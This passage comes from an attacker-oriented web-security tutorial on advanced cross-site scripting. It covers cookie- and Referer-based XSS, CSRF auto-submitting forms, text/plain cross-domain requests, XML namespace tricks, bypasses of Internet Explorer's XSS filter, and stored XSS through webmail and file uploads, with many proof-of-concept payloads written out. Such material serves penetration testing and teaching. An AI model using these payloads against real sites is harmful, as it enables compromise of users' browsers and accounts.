
Even if your attack can’t be embedded in a link or image, it can still be delivered through other methods:

- A malicious site can use JavaScript to send a ```POST``` request (e.g. ```fetch()``` or form auto-submission).

- A CSRF-style exploit could auto-submit a hidden form to the vulnerable endpoint.

- Exploits in browser extensions or tools like BeEF can also make ```POST``` requests silently.

*Reverse Tactic: From GET to POST*

On the flip side, converting a ```GET```-based attack to use ```POST``` might help you *bypass input filters.* Some applications only apply XSS protection (like keyword filtering or WAF rules) to query strings in the URL, not to the request body. In such cases, wrapping your payload into a ```POST``` body can evade detection and allow the script to slip through untouched.

#### Exploiting XSS via Cookies:

Sometimes, the vulnerable entry point for an XSS attack isn’t in a URL parameter or form field—but deep inside a *request cookie.* This can make exploitation trickier because cookies are typically controlled by the application, not by external user input like URLs. However, with some clever manipulation, you can still weaponize such bugs. Let’s explore how.

**1. Parameter Overrides (Cookie vs URL/Body Parameter Name Collision):**

*Idea:* Override the cookie’s value by supplying a URL query or POST body parameter with the *same name.*

How? Some web frameworks process parameters in a specific order. If a *URL parameter* or *POST body field* has the *same name* as a cookie, its value may take precedence, overriding the cookie value in the server’s logic. Example URL:

```
https://vuln-app.com/page?user=</script><script>alert(1)</script>
```

Accompanying Cookie:

```
Cookie: user=innocent
```

If the application reflects the ```user``` value in HTML, but gives priority to the URL parameter, your injected script might execute. Always test for such parameter collisions in Burp Repeater. Try sending *both* cookie and URL values and see which one gets echoed back.

**2. CSRF-ing Cookie Values via Application Functionality:**

*Idea:* Use a legitimate app function (like a preferences page) to set a malicious cookie value through CSRF.

How? If the app lets users modify settings via forms that result in cookie values being updated (like theme, language, etc.), you can craft a *CSRF attack* to force a victim's browser to set a cookie with your XSS payload. Example Flow:

Craft a malicious page that auto-submits a form like:

```
<form action="https://vuln-app.com/preferences" method="POST">
    <input type="hidden" name="user" value="</script><script>alert(1)</script>">
</form>
<script>document.forms[0].submit();</script>
```

Victim visits your crafted page → their browser submits this form → the application sets a new user cookie. On their next visit to a vulnerable page that reflects this cookie, boom, your payload triggers

*Challenge:* This requires two requests: one to set the cookie, one to trigger the reflected XSS.

**3. Leveraging Browser Extension Vulnerabilities (Historical & Exotic Techniques):**

*Idea:* Abuse vulnerabilities in plugins/extensions (e.g., Flash, ActiveX, legacy browser quirks) to send cross-domain requests with custom cookie headers.

- *Current Reality:* Flash is dead, but old extensions had flaws that allowed sending HTTP requests with arbitrary headers (including ```Cookie:``` headers). Some niche or legacy plugins (or even misconfigured CORS policies) might still allow similar abuses.

- *Modern Relevance?* Rare, but not impossible in corporate environments with outdated browsers/extensions. The modern equivalent would be finding a CORS misconfiguration or Service Worker abuse that lets you forge headers. Don’t rely on this for general exploitation. However, if you stumble upon an exotic internal app with legacy tech—keep this trick up your sleeve.

**4. Chaining XSS Bugs: Reflect → Persistent Cookie Setter:**

*Idea:* Use a different XSS bug (on the same domain) to plant your malicious cookie permanently. Flow:

- Find an easier-to-exploit reflected XSS elsewhere on the domain.

- Use that bug to execute JavaScript in the victim’s browser that sets a malicious cookie using:

```
document.cookie = "user=</script><script>alert(1)</script>; path=/";
```

- Once the cookie is set, the next visit to the vulnerable page that reflects this cookie will trigger your payload automatically. This approach “chained” two vulnerabilities to achieve a persistent, user-specific compromise.

*Common Myth (Busted):*

*“Cookies are safe. They’re not user-controlled, so XSS via cookies isn’t practical.”*

Wrong. Cookies *are* user-controlled in the sense that they can be manipulated:

- Via application logic (preferences pages, login workflows).

- Via attackers chaining other bugs (like CSRF or reflected XSS).

- Sometimes even by overriding them through URL or body parameters.

If the app reflects cookie values unsafely—those cookies become an attack surface. In *modern apps*, the most common cookie-related XSS you’ll encounter is when devs store user-provided names or preferences in cookies and later reflect them in templates (e.g., “Welcome back, ```{{cookie_user}}```!”) without proper encoding. Combined with subdomain-wide cookies, this can become a potent vector for escalation.

#### Exploiting XSS via the Referer Header:

Some reflected XSS vulnerabilities are quirky in that they only trigger if the *Referer header* contains a specific payload. Unlike URL or form parameters, *the Referer header isn’t directly controllable through normal input*—it’s automatically populated by the browser when making requests, indicating the page the request originated from.

However, attackers can control *where the victim navigates from.* With this knowledge, let’s explore how we can weaponize the Referer header for XSS exploitation.

**Basic Attack Flow: Exploiting a Referer-Based XSS**

*Scenario:* The application reflects parts of the Referer header into its HTML responses without proper encoding.

Attacker’s Strategy:

- Host a page on *attacker.com* with a crafted link or auto-submitting form that points to the vulnerable application.

- When the victim clicks this link (or is auto-redirected), their browser sends a request to the vulnerable URL.

- The *Referer header* will be set to the page on attacker.com containing the payload.

Example Flow:

- Attacker's malicious page:

```
<a href="https://vuln-app.com/vulnerable-page">Click me!</a>
```

Or auto-redirect:

```
<script>location.href = "https://vuln-app.com/vulnerable-page";</script>
```

- Attacker’s page URL is crafted as:

```
https://attacker.com/pwn?payload=<script>alert(1)</script>
```

- When victim clicks, their browser sends a request to vuln-app.com with:

```
Referer: https://attacker.com/pwn?payload=<script>alert(1)</script>
```

- If the vulnerable app reflects part of this Referer unsafely, *XSS achieved.*

**Same-Domain Referer Restriction & Redirector Abuse**

*Scenario:* The application only triggers the XSS if the Referer comes from *the same domain.*

*Challenge:* You can’t spoof Referer headers from attacker.com. But, if the app has a *redirector function* (e.g., ```/redirect?url=```), you can bounce your victim through it.

Redirector Exploit Flow:

- Find a redirector endpoint on vuln-app.com, like:

```
https://vuln-app.com/redirect?url=https://external.com
```

- Craft a URL that includes your XSS payload in the *redirector’s URL parameter.*

- This payload must survive through the redirect and still appear in the Referer when the victim lands on the vulnerable page.

Example Attack URL:

```
https://vuln-app.com/redirect?url=/vulnerable-page?data=<script>alert(1)</script>
```

- Victim clicks it.

- The browser visits the redirector.

- Redirector bounces the victim to ```/vulnerable-page?data=<script>alert(1)</script>```.

- The Referer header for the final request will be:

```
Referer: https://vuln-app.com/redirect?url=/vulnerable-page?data=<script>alert(1)</script>
```

- If the vulnerable page reflects this part unsafely → XSS triggered.

*Factors Influencing Success:*

1. Redirect Type Matters:

- *302 (Found)* and *303 (See Other)* redirects will typically preserve the Referer.

- *Meta refresh* redirects or JavaScript-based redirects may *not* update the Referer in some browsers.

2. Referer Truncation/Sanitization:

- Some web servers or middleware might truncate the Referer at certain characters (```?```, ```#```, ```&```), so test payload placements carefully.

3. Same-Origin Policy Loophole:

- As long as you stay within the same domain, Referer-based attacks can bypass many CSRF/XSS mitigations, making this a powerful yet often overlooked vector.

If no redirectors are found, but you have a *Reflected XSS elsewhere*, you can abuse it to ```set window.location``` to the vulnerable page. This forces a Referer header pointing to the same domain (but from your own payloaded page).

```
<script>location.href="/vulnerable-page"</script>
```

Even a *meta refresh* can sometimes do the trick:

```
<meta http-equiv="refresh" content="0;url=/vulnerable-page">
```

*Summary:* Referer-based XSS attacks are a stealthy delivery method, especially when direct URL parameters are filtered or logged. Always check for:

- Weak redirectors.

- Same-origin redirects.

- Misused Referer reflections.

## Exploiting XSS in Nonstandard Request and Response Content (Ajax, JSON, XML Madness):

Modern web applications have moved far beyond simple HTML forms. They often use *Ajax requests*, sending and receiving data in formats like *JSON, XML, or custom serialized formats.* These are typically exchanged via *background HTTP requests* (XHR or fetch API), and *responses don’t always contain HTML* — they may return raw data for JavaScript to process dynamically.

In these situations:

- You send a crafted payload in JSON/XML.

- The server reflects your input back in the *response.*

- But instead of embedding it into a rendered HTML page (which would trigger XSS), the *response is processed as raw data.*

Thus, even if the app is reflecting your payload unfiltered, *you don’t immediately get script execution.* Why? Because the browser is *treating the response as data, not code.*

To weaponize this scenario for XSS, you need to solve *two hard problems:*

**1. Triggering a Cross-Domain Request (Bypassing Same-Origin Policy):**

Normally, *XMLHttpRequest (XHR)* or ```fetch()``` *cannot send cross-origin requests freely* because of the Same-Origin Policy. However, you might bypass this by:

- Using ```<img>```, ```<script>```, or ```<iframe>``` tags to send GET requests — but only if the API accepts GET requests and the reflected data is embedded into the response.

- *Finding CORS misconfigurations* — If the server sends ```Access-Control-Allow-Origin: *``` or allows attacker.com as a trusted origin.

- *Leveraging JSONP endpoints* — Old-school JSONP APIs allow you to control a callback and load responses via ```<script src=...>``` tags.

- *Using redirector abuse* — Force a user to load an internal endpoint that reflects your payload.

- *Abusing browser quirks (rare today)* — E.g., Flash/Silverlight had cross-domain data leakage bugs in ancient times.

**2. Getting the Browser to Execute Reflected Data as Code:**

Even if you can force a victim to send a malicious request:

*The response is NOT HTML.* The browser receives *JSON, XML, or plain text,* and just stores it. The application’s *JavaScript code would usually parse and process it*, but that won’t trigger immediate script execution unless:

- *The Content-Type is text/html* — then you might be able to coerce a browser into parsing/executing embedded scripts.

- *The response is loaded into a context where it's treated as active content* (e.g., an iframe src, or script src).

- *The client-side JavaScript is vulnerable* — For example, using ```innerHTML``` or ```document.write()``` to render API responses unsafely.

- *MIME Sniffing* — If the server returns a *Content-Type like text/plain*, but browsers "sniff" it and misinterpret it as HTML.

**Example Scenario:**

- You find an API that reflects your JSON payload:

```
{"status":"<script>alert(1)</script>"}
```

- The response is JSON (```application/json```), so no direct execution.

Exploitation path:

1. You find a page where the app does:

```
element.innerHTML = apiResponse.status;
```

— BAM, reflected XSS through *unsafe client-side rendering.*

2. Alternatively, you find the API accepts GET requests:

```
<script src="https://victim.com/api?payload=<script>alert(1)</script>"></script>
```

— If server returns ```application/javascript```, you might achieve *script execution directly.*

3. Or, you inject into a response where the app *builds dynamic JavaScript from JSON data* without sanitization:

```
eval('var data = ' + apiResponse);
```

*Present-Day Considerations:*

- *Modern CORS Policies* have reduced the number of cross-origin XHR tricks, but CORS misconfigurations still exist.

- ```Fetch()``` *is safer than ancient XHR* but still prone to logic flaws.

- *MIME sniffing defenses are better today*, but some legacy apps can still fall victim to "text/plain but sniffed as HTML" attacks.

- Client-side *DOM-based XSS* is often the weakest link — unsanitized use of ```innerHTML```, ```document.write()```, or unsafe ```eval()``` is still out there.

*If an API reflects your input but responds in non-HTML formats, you’ll need:*

- A creative delivery method (forcing the victim to make that request).

- A processing flaw in the app’s frontend JavaScript that turns that innocent-looking JSON/XML into executable code.

### Sending XML Requests Cross-Domain with ```enctype="text/plain"```:

Modern browsers are strict with *Same-Origin Policy*, making it tough to send arbitrary POST requests cross-domain. However, there’s a quirky old technique where you can use a *regular HTML* ```<form>``` *with* ```enctype="text/plain"``` to craft custom HTTP request bodies.

*How Does ```enctype="text/plain"``` Work?*

Each *form parameter* becomes a line in the HTTP request body. The format is:

```
parameter_name=parameter_value
```

*No URL encoding is performed* — the values are sent *as-is.* Example Request Body:

```
param1=value1
param2=value2
```

Not all browsers honor this behavior fully, but modern Firefox and Chromium-based browsers still allow it. IE and Opera references are outdated (they're fossils now).

*Message Body = After the Headers?*

The *HTTP request body* is what comes *after the headers and a blank line (CRLF sequence).* Example:

```
POST /vuln.php HTTP/1.1
Host: target.com
Content-Type: text/plain
Content-Length: 42

param_name=param_value
```

*Why Do We Need an Equals Sign?* Here’s the sneaky bit:

- The browser will always place an equals sign between a parameter name and value. So if you want to craft a raw payload (like XML), you must *split the payload into two parts:*

Part before the ```=```, goes into the ```name``` attribute.

Part after the ```=```, goes into the ```value``` attribute.

- This trick allows you to "glue" arbitrary data together with the equals sign in the middle, forming payloads browsers would otherwise block.

**Example — Crafting an XML Payload via Form:**

Let’s say we want to send this XML in the request body:

```
<?xml version="1.0"?><data><param>foo</param></data>
```

We can achieve it like this:

```
<form enctype="text/plain" action="http://victim.com/vuln.php" method="POST">
  <input type="hidden" name='<?xml version' value='"1.0"?><data><param>foo</param></data>'>
</form>
<script>document.forms[0].submit();</script>
```

The browser will send:

```
<?xml version="1.0"?><data><param>foo</param></data>
```

→ The equals sign is tricked into sitting perfectly in the XML’s version attribute.

*Why Double HTML-Encode?*

- If you need special characters in the payload (like ```<```, ```>```, ```&```), you might have to *HTML-encode them inside the form*, because browsers parse HTML before sending the request. Some characters might require *double-encoding* so that they survive:

First pass: parsed by browser rendering the form.

Second pass: interpreted by server receiving the request.

**Exploiting JSON with Equals Sign:**

If the target app accepts *JSON POST data*, you can perform a similar trick:

- JSON keys and values are delimited by colons, but you can smuggle an equals sign in *user-controllable values.* Example JSON:

```
{"name":"John","comment":"="}
```

Using the form:

```
<form enctype="text/plain" action="http://victim.com/vuln.php" method="POST">
  <input type="hidden" name='{"name":"John","comment"' value=':"="}'>
</form>
<script>document.forms[0].submit();</script>
```

Browser sends:

```
{"name":"John","comment":"="}
```

*Additional Notes:* The colon (```:```) is the standard JSON syntax that separates a *key* from its *value.*

But in the *form enctype="text/plain"* trick, the browser *forces an equals sign* (```=```) *between the parameter name and value* when constructing the request body. So when we define the form like this:

```
<input type="hidden" name='{"name":"John","comment"' value=':"="}'>
```

The browser sends this body:

```
{"name":"John","comment"=:"="}
```

→ *The equals sign is injected where you want it*, between the parameter name and value. But JSON expects colons (```:```) to separate keys and values, NOT equals signs. This trick only works if the application *parses the request loosely*, forgiving the incorrect ```=``` and still interpreting it as valid JSON or at least processing it in a usable way.

Some sloppy backends *replace the first equals* (```=```) *with a colon* (```:```) when they parse incoming data or parse it into a generic key-value dictionary before parsing JSON. Alternatively, if the equals sign lands *within a free-form value field*, like:

```
{"comment":"="}
```

then you're golden — no parser will care that an equals sign is part of the string literal value.

*TL;DR:*

- The colon (```:```) inside the value attribute is intentional.

- The *browser inserts the equals sign* (```=```) between ```name``` and ```value``` automatically.

- The result is you get control over where an equals appears in the raw POST body.

- You're leveraging this to structure JSON/XML payloads *despite browser restrictions.*

Overall, the main goal is to “probe” if the application:

1. Accepts arbitrary data in the *request body* even when *Content-Type is text/plain.*

2. Lets you *inject an equals sign* into a *free-form field value* (like a comment, username, or description).

3. Doesn’t break the backend parsing logic despite this weird input structure.

If that works — boom, you can start crafting real payloads (like JSON, XML, or serialized objects) by sneaking them in through this equals-sign trick, even cross-domain. Think of it as cracking open the initial gap to test if you can escalate it into a full exploit.

*The ```Content-Type: text/plain``` Caveat:*

This is the Achilles’ heel.

- The form will always send ```Content-Type: text/plain```.

- Many APIs expect ```application/json``` or ```application/xml``` and will reject or mishandle requests with the wrong content-type.

- However, *some applications process the body anyway*, ignoring the Content-Type header (either by design or mistake).

*Can We Tamper with Content-Type in Burp?*

- Yes, you can modify Content-Type headers manually in Burp *after intercepting the request.*

- BUT—when using this form trick via a browser, *the browser won’t let you override Content-Type* via HTML.

- *Tampering in Burp is useful for testing*, but for a real exploit, the application itself must not care about Content-Type, or you’d need another trick (like abusing a CORS flaw).

*TL;DR Key Insights:*

- *Text/plain forms* are a legacy trick to craft arbitrary request bodies, provided you can work with that mandatory equals sign.

- Great for smuggling XML or JSON payloads into POST requests cross-domain.

- The *Content-Type: text/plain* is the main limitation.

- Perfectly works for apps that don’t enforce strict Content-Type validation. You can prototype this in Burp to see if the app is vulnerable before trying to build a real exploit scenario.

### Executing JavaScript from Within XML Responses:

When you're trying to exploit XSS-like behavior in *nonstandard content types* (like XML or JSON responses), the *second major challenge* is to manipulate the *response content* in a way that *forces the browser to execute your script*, even though the response isn’t traditional HTML. In some lucky cases, this might be trivial:

- The response could have *no Content-Type header*, or it might be misconfigured (e.g., ```text/plain``` instead of ```application/xml```).

- Your reflected payload might appear *right at the top* of the response body.

In such scenarios, browsers might get confused, ignore the declared type, and treat the response as HTML—allowing direct execution of your payload. But usually, it’s not that simple:

- The *Content-Type* header correctly declares something like ```application/xml```.

- Your payload is *buried deep* in the middle of a well-formed XML document.

- Browsers nowadays are stricter: they either trust Content-Type headers explicitly or sniff the content (MIME sniffing) to verify it’s correct.

So even if you reflect ```<script>alert(1)</script>```, the browser will still treat the response as *XML data*, not HTML — hence no script execution.

*Can I tamper with the Content-Type in Burp?*

- *Tampering the request* (e.g., changing ```Accept``` header to prefer HTML) *might* influence the response type.

- *Tampering the response Content-Type in Burp Repeater/Proxy* will fool your browser during testing, but not when delivering to real victims.

In short: *unless the server or client-side code is broken/misconfigured*, this tampering won't be reliable in real-world exploitation.

*The Namespace Switcheroo Exploit (XML Namespaces for XSS):*

But there’s a clever trick for XML responses — *defining a namespace alias to XHTML.* Here’s how it works:

1. XML allows you to define *custom namespaces.*

2. By assigning a namespace to *XHTML’s URL*, you can create elements (prefixed with that namespace) that are parsed as *HTML elements* by the browser.

3. That means you can inject something like an ```<a:body onload=alert(1)>``` which gets interpreted as a real HTML ```<body>``` tag.

Example Payload:

```
HTTP/1.1 200 OK
Content-Type: text/xml
Content-Length: 1098

<xml>
  <data>
    <a xmlns:a="http://www.w3.org/1999/xhtml">
      <a:body onload="alert(1)"/>
    </a>
  </data>
</xml>
```

Key Points:

- ```xmlns:a``` defines a new namespace prefix ```a``` mapped to XHTML.

- ```<a:body>``` is now effectively an HTML ```<body>``` element.

- The ```onload``` event executes when the browser renders this part.

- Works in browsers like Firefox which process namespaces properly.

But… this only works if:

- The browser *is directly rendering* the XML response (e.g., opened as a page/tab).

- If a JavaScript function (like ```XMLHttpRequest```) processes the XML and strips tags, you’re out of luck.

- This exploit *bypasses the declared Content-Type* by tricking the parser through valid XML syntax.

*To Sum It Up:*

You're *weaponizing XML namespaces* to "sneak in" HTML elements and event handlers. The server thinks it's a boring XML doc, but the browser is like, "Oh, that looks like XHTML, let’s run it!" — this is pure parsing trickery, not brute force.

## Attacking Browser XSS Filters:

Modern browsers (especially legacy ones like Internet Explorer) included *built-in XSS filters* designed to protect users from reflected XSS attacks. These filters would passively analyze HTTP requests and responses, looking for patterns of *malicious input reflected in the response*, and attempt to neutralize scripts before they execute. While this sounded like a savior, attackers quickly found clever ways to bypass or even exploit these filters.

*Present Day Reality:*

Most modern browsers (Chrome, Firefox, Edge) have *deprecated these passive XSS filters* because they were both ineffective and introduced new vulnerabilities (filter-bypass tricks). However, *older systems or apps stuck with IE compatibility modes* might still use them. So for real-world testing today, it's a legacy quirk, but an attacker could still encounter such filters in outdated corporate environments.

*How IE’s XSS Filter Worked (in short):*

1. It monitored *cross-domain requests.*

2. It examined *parameter values* in the request, scanning them against a *blacklist of suspicious patterns.*

3. If a parameter looked malicious (e.g., it included ```<script>```), it would scan the *response body* to see if that same value appeared.

4. If a match was found, it "sanitized" the response, e.g., modifying ```<script>``` to ```<sc#ipt>```, thus breaking the payload.

*Ways to Bypass and Abuse the XSS Filter:*

1. Parameters Names Are Ignored

IE’s filter *only checks parameter values*, not parameter names.

- If an app reflects the *entire URL or query string* somewhere (like ```GET /search?q=<script>abc</script>```), but your *payload is injected into the parameter name* instead of the value, the filter won’t catch it.

Example: ```/page?<script>alert(1)</script>=ignored```

- If the vulnerable app reflects this whole query string back into HTML, you’re in.

2. Splitting Payloads Across Parameters (Payload Chunking)

- Since IE's filter checks *each parameter separately*, but the app might reflect *multiple parameters into a single place*, you can *split a malicious payload across multiple params:*

Example: ```/page?part1=<script>&part2>alert(1)</script>```

- Neither parameter matches the blacklist alone, but when combined in the response, the app inadvertently *rebuilds your attack.* This is the same trick as *spanning XSS payloads across multiple fields to bypass length limits*, just now applied to XSS filters.

3. On-Site Requests Are Not Checked

For performance reasons, IE’s filter focused on *cross-domain requests* only. If you can inject a *malicious link into an app page* (e.g., through a reflected parameter, user input, or URL shortener), and get a victim to click it, the filter won't intervene. Example flow:

- Inject malicious link onto the site.

- Victim clicks it.

- Filter thinks it's "on-site" and lets it through.

4. Parameter Value Concatenation Quirks

When an app receives multiple parameters with the *same name*, like:

```
pi=foo&pi=bar
```

Some frameworks (like ASP.NET) concatenate the values:

```
pi = "foo,bar"
```

But IE’s XSS filter *still checks each parameter separately.* This means you can *span your payload across multiple same-named parameters*, bypassing the blacklist, but the app will glue them together. Example exploit:

```
pi=<sc&pi=ript>alert(1)</scr&pi=ipt>
```

Each piece is harmless alone, but combined by the app, it reconstructs ```<script>alert(1)</script>```, and the filter fails to detect it.

5. Exploiting the Filter’s Own Sanitization to Attack

IE's XSS filter is *passive* — it doesn’t truly “understand” the app logic. It just sees that a suspicious string appears in both request and response and tries to neutralize it. This behavior can be *abused by attackers to selectively “break” legit application scripts.* Example:

The app includes a JavaScript snippet like this:

```
<script>var isLoggedIn = true;</script>
```

- You craft a request where a parameter contains: ```isLoggedIn```

- The filter sees "isLoggedIn" in your input and in the response script.

- It thinks it's a reflection attack and *butchers the script to:*

```
<sc#ipt>var isLoggedIn = true;</sc#ipt>
```

Result: the *app's own security code is neutralized.*

If you know that certain *defensive scripts (like frame-busters, CSP logic, anti-clickjacking measures)* exist, you can target them using this behavior:

- You insert a snippet of the script’s own code into your parameter.

- The filter “defends” by corrupting the script.

- You now have a *broken security mechanism* you can exploit (e.g., iframe hijack).

*Conclusion on This Section:*

- The IE XSS filter tried to be smart, but it could be *outsmarted with quirks, parameter juggling, and creative abuse.*

- Even though modern browsers ditched this filter, learning how to *exploit sanitizers and auto-defenses* is still very relevant today (WAFs, CSP bypasses, etc.).

- The mindset of *abusing protective mechanisms themselves as attack vectors* is a hacker’s goldmine.

## Finding and Exploiting Stored XSS Vulnerabilities:

The hunt for *stored (persistent) XSS vulnerabilities* shares similarities with reflected XSS testing—like systematically injecting unique test strings into every input field—but there are *crucial differences* that can trip up even experienced testers. Stored XSS requires a more holistic and patient approach, as the payload isn’t reflected immediately but gets stored in a backend system and later rendered in various application contexts.

*Key Steps for Identifying Stored XSS:*

1. Spray Unique Payloads and Track Their Echoes

After you’ve injected a *unique identifier string* (like ```XSS_TEST123```) into every input field, you need to comb through *the entire application again* and look for every place where this string gets rendered back to the browser.

Think beyond the obvious places: it might pop up in dashboards, activity feeds, notifications, emails, or API responses.

Each rendering context might have *different sanitization filters.* You might bypass weak ones while being blocked by others. Example:

- You inject ```XSS_TEST123``` into the *profile bio.* It appears not only on your *profile page* but also in:

- Other users’ *contact lists.*

- In *admin dashboards.*

- Within *search results.*

- Even in *internal logs* shown in the web interface.

2. Focus on Administrator-Only Interfaces

Many apps allow admins to view data submitted by users, like:

- Logs

- Support tickets

- Feedback forms

These areas often display *unsanitized user input*, making them perfect targets for stored XSS payloads aimed at privileged users. This is your classic *privilege escalation via stored XSS.*

3. Complete Multi-Step Processes

Some inputs only get saved after going through a *multi-stage workflow.* For instance:

- Shopping cart checkouts.

- User registration wizards.

- Complex form submissions (loan applications, etc.).

If you just inject a payload into step 1 and stop there, you might miss vulnerabilities that only trigger after the entire process is completed and data gets finalized into the backend.

4. Don’t Forget Out-of-Band Input Vectors

Stored XSS isn’t limited to the fields you see in a form. Think of *any channel that submits user-controllable data to the application:*

- Email parsers (email-to-ticket systems)

- Webhook integrations

- Third-party data imports

- API endpoints

Example: An XSS payload sent via an email that gets processed into a *ticketing system’s web interface*, where the payload finally executes.

5. Uploaded Files: Hidden XSS Time Bombs

File upload functionality is a dangerous zone. Even if the app restricts file types, consider:

- PDF files with JavaScript (e.g., Adobe Reader bugs).

- SVG images that contain script tags.

- Stored filename XSS (e.g., uploading a file named ```<script>alert(1)</script>.jpg```).

We’ll cover this more later, but always keep an eye on how *uploaded file metadata* is rendered back to users.

6. “Indirect Stored XSS” via Application Features (The Popular Search Terms Example)

This one is subtle but important. Some apps *store user interactions* (like search terms, comments, etc.) and later aggregate them into *publicly visible stats:*

- Popular search terms lists

- Recently viewed items

- Most liked posts

Even if the search function itself *escapes your input safely*, the *analytics or auto-complete feature* might later render your payload without proper sanitization. Example exploit:

- You search for ```<img src=x onerror=alert(1)>``` 100 times.

- The app compiles a “Popular Searches” widget.

- Boom. Your XSS payload now shows up on the homepage under "Popular Searches".

This is an *indirect stored XSS vector*, exploiting features that *aggregate user-controlled data.*

*Tracking Down Parameters with Unique Identifiers:*

When testing for reflected XSS, it’s easy to spot where your payload bounces back. Stored XSS, however, is messy:

- You might inject the same string into multiple fields.

- The app could render that string somewhere unexpected later.

- You won’t always know which field triggered which reflection.

Solution: Use field-specific identifiers. Example:

- Inject ```XSS-USERNAME-TEST``` in the username.

- Inject ```XSS-BIO-TEST``` in the bio.

This helps trace which field’s data ends up vulnerable and where.

Stored XSS isn’t just about injecting payloads. It’s about following the *data lifecycle:*

- Where does the app *accept input?*

- Where does it *store it?*

- Where (and how) does it *render it back to users?*

Sometimes you’ll have to play a long game, waiting for backend processes (like content moderation workflows) to surface your payload in an admin dashboard.

### Testing for XSS in Web Mail Applications:

Webmail applications are natural breeding grounds for stored XSS vulnerabilities. Why? Because their core functionality is to *receive and render HTML content from third-party sources*—exactly the type of untrusted input that XSS loves to exploit.

The simplest testing scenario involves:

1. Registering an account on the target webmail application.

2. Sending crafted emails containing XSS payloads to yourself.

3. Viewing the email in-browser and observing if your payload executes.

Here’s the problem: If you send emails using a regular email client (Thunderbird, Outlook, etc.), the client might:

- Sanitize or correct malformed HTML.

- Restrict what headers and content you can set.

- Encode payloads in a way that ruins your test.

Hence, you need *raw control* over the email content.

*Method 1: Using ```sendmail``` for Raw Email Injection*

On UNIX-like systems, you can leverage *sendmail* for raw email crafting. Command example:

```
sendmail -t < email.txt
```

Where ```email.txt``` is your handcrafted email content, like this:

```
MIME-Version: 1.0
From: test@example.org
To: yourmail@target.com
Subject: XSS test
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: 7bit

<html>
<body>
<img src='' onerror='alert(1)'>
</body>
</html>
```

*Additional Notes:*

- The sendmail command is valid but not commonly installed/configured by default. You can achieve the same with tools like *swaks, msmtp,* or even Python’s *smtplib* for better control.

- Example using ```swaks```:

```
swaks --to yourmail@target.com --from test@example.org --data email.txt --server smtp.example.com
```

- Modern webmail apps often *sanitize or sandbox content*, but the application logic is still the vulnerable surface—not the email client. Example: Gmail's strict sanitization vs. self-hosted Roundcube instance that might mishandle HTML email rendering.

Most modern mail clients (Thunderbird, Outlook, Apple Mail) have evolved to:

- Default to *Plain Text View.*

- Disable loading of *external resources* (images, scripts) unless the user explicitly allows it.

- Render HTML in *sandboxed iframes* with heavy sanitization (like Gmail does).

Thus, *direct client-side XSS* via email is far less viable *against robust email clients.* But *Webmail Applications Are Still Vulnerable*

Web-based email apps are the real target here:

- *If the webmail interface reflects email content into the DOM without proper sanitization*, stored XSS is alive and well.

- Webmail systems with *custom implementations*, self-hosted mail servers (like Roundcube, Zimbra), or niche SaaS platforms are often poorly configured.

Payload scenarios you want to test:

- ```<img src=x onerror=alert(1)>``` in email body.

- ```<svg onload=alert(1)>``` for SVG vector.

- Using *payloads in email subjects, attachment names, or custom headers* to test if those are reflected in any insecure contexts.

*Tips for Comprehensive Email XSS Testing:*

1. Test both HTML and plain text views.

2. Manipulate Content-Type headers:

- ```text/html```

- ```multipart/alternative```

- ```multipart/mixed``` with attachments.

3. Try *breaking out of the intended context* (e.g., injecting into an ```<a>``` tag’s ```href``` attribute).

4. Always check how the email is rendered in *preview panes, full views, and mobile versions* of the webmail client.

*TL;DR*

- *Direct XSS in email clients like Thunderbird is unlikely today*, due to enforced plain-text views and disabled remote content.

- *Webmail applications, however, are prime targets*, especially self-hosted or poorly coded ones.

- You need *full control over the raw email content*, using tools like ```sendmail```, ```swaks```, or custom SMTP scripts.

- Modern testing is less about “will Gmail pop an alert?” and more about *can I get my payload reflected in the webmail’s DOM in unsafe ways?*

### Testing for XSS in Uploaded Files:

A *commonly overlooked XSS vector* is when applications allow users to *upload files* that can later be downloaded and viewed by others. Think of:

- Document-sharing platforms.

- Profile picture uploads.

- Web mail attachments.

- Blog image galleries.

- Project collaboration tools.

If the application mishandles uploaded content—especially *trusting file extensions or misconfigured content types*—it opens the door to *stored XSS attacks.*

*Key Factors Affecting File Upload Exploitation:*

1. File Extension Restrictions:

- The app may reject files with “dangerous” extensions like ```.html```, ```.js```, ```.php```. But if the app only checks the extension string, you might bypass this by uploading:

```payload.html.jpg```

```payload.txt```

Unicode tricks like ```payload.jpg%00.html``` (null byte attacks, though modern servers are much better at blocking this now).

2. Content Inspection (MIME Sniffing Protection):

- Some apps inspect the *magic bytes* (file signature) to ensure files match the claimed format (like JPEG headers). But lazy implementations only check the first few bytes, which can be padded before malicious content.

3. Content-Type Header on Download:

- When serving the uploaded file, the app may respond with:

```
Content-Type: image/jpeg
Content-Disposition: inline
```

- But if the file actually contains HTML/JavaScript, older browsers could still parse and execute it as HTML.

- Modern browsers (post-2015) are stricter, *refusing to override Content-Type headers*—but it's still situational.

4. Content-Disposition Header:

- If set to ```attachment```, the browser will prompt the user to download the file.

- If set to ```inline``` (or absent), the browser might *render the file directly*, depending on its *MIME sniffing behavior.*

**Testing Workflow:**

*Step 1: Basic PoC HTML Upload:*

Try uploading a simple ```.html``` file containing:

```
<script>alert('XSS')</script>
```

If the upload is successful, and when accessed, the script executes—you’ve got a *trivial stored XSS.*

*Step 2: File Extension Evasion:*

If ```.html``` gets blocked, try:

- ```xss.txt```

- ```image.jpg```

- Files with *double extensions* or *MIME confusion* tricks.

Test if the application only filters by extension or actually inspects file contents.

*Step 3: File Download Behavior:*

Download the uploaded file and inspect:

- Is *Content-Type* being set according to extension (e.g., image/jpeg, text/plain, etc.)?

- Does *Content-Disposition* force download or inline view?

Example response:

```
HTTP/1.1 200 OK
Content-Type: image/jpeg
Content-Disposition: inline
<script>alert('XSS')</script>
```

Older browsers like *IE8–IE10* would sometimes ignore the ```Content-Type``` if the *actual content was HTML/JS*, especially if the file was opened directly in a tab. *Modern browsers are more cautious*, but edge cases still pop up, particularly in *self-hosted or poorly maintained web apps.*

*Step 4: “MIME Sniffing” Bypass:*

Even if an app sets ```Content-Type: image/jpeg```, browsers can sometimes override it if:

- There’s no proper *X-Content-Type-Options: nosniff* header.

- The browser detects embedded HTML-like structures early in the file.

- You're targeting a vulnerable rendering context (e.g., loading the file in an iframe without sandboxing).

*Realistic Present-Day Viability:*

- *Modern browsers (Chrome, Firefox, Edge)* aggressively respect Content-Type and prevent "sniffing" mismatches. But… *self-hosted apps, old browsers, mobile webviews, and Electron-based clients* are wildcards.

- *Content-Disposition: inline + wrong Content-Type* is risky if developers trust extensions too much.

